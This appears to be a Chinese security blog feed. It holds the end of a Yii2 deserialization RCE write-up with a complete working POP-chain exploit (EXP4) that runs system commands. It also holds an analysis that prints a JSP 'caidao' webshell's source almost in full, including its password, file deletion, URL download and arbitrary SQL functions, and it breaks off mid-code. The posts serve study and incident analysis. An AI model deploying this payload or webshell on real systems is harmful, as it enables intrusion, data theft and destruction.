class="line">\phpDocumentor\Reflection\DocBlock\Tags\Deprecated::__toString -&gt; render 可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Generic::__toString -&gt; render 可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\See::__toString -&gt; render可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Link::__toString -&gt; render</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>以<code>\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString</code>为例，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) : <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;refers . (<span class="keyword">$this</span>-&gt;description ? <span class="string">&#x27; &#x27;</span> . <span class="keyword">$this</span>-&gt;description-&gt;render() : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;refers</code>和<code>$this-&gt;description</code>可控。同时它在调用<code>render()</code>时会调用<code>__call</code>魔术方法。</p><p>之后就与POP1的后半段链一样了。</p><p>完整的POP链如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP4:</span><br><span class="line">\Swift_KeyCache_DiskKeyCache::__destruct -&gt; clearAll -&gt; clearKey -&gt; __toString</span><br><span class="line">-&gt; </span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString -&gt; render</span><br><span class="line">-&gt; </span><br><span class="line">Faker\Generator::__call()-&gt;format() -&gt; call_user_func_array()</span><br><span class="line">-&gt;</span><br><span class="line">\yii\rest\IndexAction::run -&gt; call_user_func()</span><br></pre></td></tr></table></figure><p><strong>EXP4</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// EXP: Swift_KeyCache_DiskKeyCache::__destruct -&gt; __toString -&gt; __call</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">Covers</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">private</span> $keys;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;V0W&quot;</span> =&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>, <span class="string">&quot;Ca1j1&quot;</span>)</span><br><span class="line">            );  <span class="comment">//注意 ClearAll中的数组解析了两次，之后再unlink</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> Covers();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $payload = <span class="keyword">new</span> Swift_KeyCache_DiskKeyCache();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Covers</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $refers;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;refers = <span class="string">&quot;AnyStringisOK&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls -al&#x27;</span>;           <span class="comment">//command</span></span><br><span class="line">            <span class="comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> IndexAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">            <span class="comment">//stopProcess方法里又调用了isRunning()方法: $process-&gt;isRunning()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是会报错，但是命令顺利执行了：</p><p><img src="http://image.v0w.top/Blog/2020-09-23-205302.png" alt="EXP4"></p><h2 id="3-3-不能利用的类"><a href="#3-3-不能利用的类" class="headerlink" title="3.3 不能利用的类"></a>3.3 不能利用的类</h2><p>以下是我在查找可利用方法时，做的一点记录，但是因为可能会一眼扫过去，漏掉了，所以仅供参考，师傅们，别因为这个丢了一个0day :)</p><p><strong>可控变量调用 非本类方法时，会调用</strong><code>__call</code><br>也就是说要满足这样的正则表达式：<code>\$this-&gt;(\w+)-&gt;(\w+)\(\)</code></p><ul><li><p><code>\Faker\Generator::__destruct</code>调用<code>seed()</code>方法（同类），<code>seed()</code>也没有可控变量。</p></li><li><p><code>\GuzzleHttp\Psr7\FnStream</code>类存在<code>__destruct()</code>函数，而且调用<code>call_user_func($this-&gt;_fn_close);</code>但是同时重写了<code>__wakeup()</code>方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">LogicException</span>(<span class="string">&#x27;FnStream should never be unserialized&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>\GuzzleHttp\Psr7\Stream::__destruct</code>调用的方法是本类中存在或者原生方法，不调<code>__call()</code></p></li><li><p><code>\PHP_Token_Stream::__destruct</code>未调用任何其他方法。</p></li><li><p><code>\Swift_Message::__wakeup</code>无可控变量。</p></li><li><p><code>\Swift_ByteStream_TemporaryFileByteStream::__destruct</code>调用<code>getPath()</code>但是在<code>getPath()</code>中的没有可控变量调用额外方法，不触发<code>__call()</code></p></li><li><p><code>\Swift_CharacterReaderFactory_SimpleCharacterReaderFactory::__wakeup</code>不调用<code>__call()</code></p></li><li><p><code>\Swift_Encoder_QpEncoder::__wakeup</code>没有可控变量。</p></li><li><p><code>\Swift_Mime_SimpleMimeEntity::__destruct</code>:<code>$this-&gt;cache</code>不可控</p></li></ul><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本文从头到尾捋了一遍Yii的反序列化，从不同的视角和不同的触发点将这个漏洞深入学习了一下。复现出来了两个EXP（EXP1，EXP2，略有改动）。自己挖掘构造了在v2.0.38版本下可以继续利用POP链，并完成两个EXP的编写（EXP3，EXP4），在v2.0.38中测试，均成功RCE。</p><p>感觉PHP的反序列化，在挖掘过程中，主要是要把握触发点和利用链。整个POP链的构造过程非常有意思，另外，还学习到了一些新知识，比如<code>call_user_func</code>中的<code>callback</code>可以是数组，这个姿势之前就没注意过。</p><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><p><a href="https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA"> 米斯特安全团队-CVE-2020-15148 Yii2反序列化RCE POP链分析</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/jX0b0_690ie3xbaj7mj82Q">ChaBug-Yii2 反序列化（CVE-2020-15148）分析</a></p></li><li><p><a href="https://juejin.im/post/6874149010832097294">掘金-我是如何挖掘yii2的反序列化0day的</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsp webshell分析笔记</title>
      <link href="/2020/09/02/jsp-webshell/"/>
      <url>/2020/09/02/jsp-webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天突然接到一个任务，称客户需要分析一个webshell，于是放在手边的工作来看一看，发现这是一个jsp经典的菜刀木马。简单分析一个每个函数的功能吧。</p><h1 id="0x01-webshell文件分析"><a href="#0x01-webshell文件分析" class="headerlink" title="0x01 webshell文件分析"></a>0x01 webshell文件分析</h1><p>所传webshell为<code>webshell.jpg</code>文件，通过<code>010editor</code>发现，并未对文件进行编码和加密，只是修改了文件名。</p><p>对<code>webshell.jsp</code>代码每一个方法的分析如下：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;      </span><br><span class="line">&lt;%!String Pwd = <span class="string">&quot;QWEasd123&quot;</span>;                     <span class="comment">//webshell密码</span></span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">EC</span><span class="params">(String s, String c)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;<span class="comment">//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//依照给定的参数s连接数据库</span></span><br><span class="line">    <span class="function">Connection <span class="title">GC</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);                    <span class="comment">//以回车符\r\n作为分割</span></span><br><span class="line">        Class.forName(x[<span class="number">0</span>].trim()).newInstance();               <span class="comment">//第一行是数据库驱动类名</span></span><br><span class="line">        Connection c = DriverManager.getConnection(x[<span class="number">1</span>].trim());<span class="comment">//第二行是jdbc的url</span></span><br><span class="line">        <span class="keyword">if</span> (x.length &gt; <span class="number">2</span>) &#123;                                  <span class="comment">//第三行(如果有的话)指定了具体的数据库名</span></span><br><span class="line">            c.setCatalog(x[<span class="number">2</span>].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到系统中所有根目录下的每一个文件的名字的前两个字母，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AA</span><span class="params">(StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File r[] = File.listRoots();                            <span class="comment">// 获取根目录文件名</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r.length; i++) &#123;                    </span><br><span class="line">            sb.append(r[i].toString().substring(<span class="number">0</span>, <span class="number">2</span>));    <span class="comment">// 每个文件的前两个字母，写入StringBuffer</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到指定路径下所有文件的 文件名、最后一次修改时间、文件大小、是否可读可写属性，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">BB</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File oF = <span class="keyword">new</span> File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = <span class="keyword">new</span> java.util.Date(l[i].lastModified());       <span class="comment">//最后一次修改时间</span></span><br><span class="line">            sT = fm.format(dt);                      <span class="comment">// 修改时间按照格式yyyy-MM-dd HH:mm:ss 写入dt</span></span><br><span class="line">            sQ = l[i].canRead() ? <span class="string">&quot;R&quot;</span> : <span class="string">&quot;&quot;</span>;             <span class="comment">// 可读写R</span></span><br><span class="line">            sQ += l[i].canWrite() ? <span class="string">&quot; W&quot;</span> : <span class="string">&quot;&quot;</span>;          <span class="comment">// 可写写W</span></span><br><span class="line">            <span class="keyword">if</span> (l[i].isDirectory()) &#123;                   <span class="comment">// 判断是否为目录</span></span><br><span class="line">                sb.append(l[i].getName() + <span class="string">&quot;/\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length()</span><br><span class="line">                        + <span class="string">&quot;\t&quot;</span> + sQ + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sF += l[i].getName() + <span class="string">&quot;\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length() + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + sQ + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//迭代删除给定路径下的所有文件和文件夹</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">EE</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        <span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; x.length; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将指定路径的文件以流的形式写到response里面</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">FF</span><span class="params">(String s, HttpServletResponse r)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(s));</span><br><span class="line">        os.write((<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GG</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String h = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = <span class="keyword">new</span> FileOutputStream(f);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; d.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            os.write((h.indexOf(d.charAt(i)) &lt;&lt; <span class="number">4</span> | h.indexOf(d</span><br><span class="line">                            .charAt(i + <span class="number">1</span>))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将s指定的文件的内容写到d指定的文件里面。如果s指定的是一个文件夹，那么就将s目录下的所有文件拷贝到d目录下</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">HH</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File sf = <span class="keyword">new</span> File(s), df = <span class="keyword">new</span> File(d);</span><br><span class="line">        <span class="keyword">if</span> (sf.isDirectory()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + <span class="string">&quot;/&quot;</span> + z[j].getName(), d + <span class="string">&quot;/&quot;</span> + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            FileInputStream is = <span class="keyword">new</span> FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = <span class="keyword">new</span> FileOutputStream(df);</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">            <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                os.write(b, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//更改文件名</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">II</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File sf = <span class="keyword">new</span> File(s), df = <span class="keyword">new</span> File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建目录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">JJ</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改文件的最后修改时间这个属性</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">KK</span><span class="params">(String s, String t)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        SimpleDateFormat fm = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//s参数为url,将url的内容写入d参数指定的文件中</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LL</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL u = <span class="keyword">new</span> URL(s);</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        FileOutputStream os = <span class="keyword">new</span> FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">        <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将流一行一行写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">MM</span><span class="params">(InputStream is, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">        <span class="keyword">while</span> ((l = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            sb.append(l + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到所有的数据库的名称，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">NN</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="number">1</span>) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取数据库所有的表，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">OO</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; <span class="string">&quot;TABLE&quot;</span> &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="string">&quot;%&quot;</span>, t);</span><br><span class="line">        <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="string">&quot;TABLE_NAME&quot;</span>) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//s的前三行参数同GC()方法，第四行为表名，得到该表的每一列的列名和类型，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PP</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1007</span>);</span><br><span class="line">        ResultSet r = m.executeQuery(<span class="string">&quot;select * from &quot;</span> + x[<span class="number">3</span>]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + <span class="string">&quot; (&quot;</span> + d.getColumnTypeName(i)</span><br><span class="line">                    + <span class="string">&quot;)\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//q为查询的sql语句，将查询的结果写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">QQ</span><span class="params">(String cs, String s, String q, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1008</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            <span class="keyword">int</span> n = d.getColumnCount();</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + <span class="string">&quot;\t|\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + <span class="string">&quot;\t|\t&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;Result\t|\t\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(<span class="string">&quot;Execute Successfully!\t|\t\r\n&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + <span class="string">&quot;\t|\t\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//以下为访问URL时带的参数</span></span><br><span class="line">    <span class="comment">//z0：编码</span></span><br><span class="line">    <span class="comment">//Pwd=QWEasd123：可以理解为功能选项,看看下面的代码就知道了</span></span><br><span class="line">    <span class="comment">//z1：普通参数</span></span><br><span class="line">    <span class="comment">//z2：普通参数</span></span><br><span class="line"></span><br><span class="line">    String cs = request.getParameter(<span class="string">&quot;z0&quot;</span>)==<span class="keyword">null</span>?<span class="string">&quot;gbk&quot;</span>: request.getParameter(<span class="string">&quot;z0&quot;</span>) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(<span class="string">&quot;text/html;charset=&quot;</span> + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(<span class="string">&quot;z1&quot;</span>) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(<span class="string">&quot;z2&quot;</span>) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>);                  <span class="comment">//开头的 -&gt;| </span></span><br><span class="line">        <span class="keyword">if</span> (Z.equals(<span 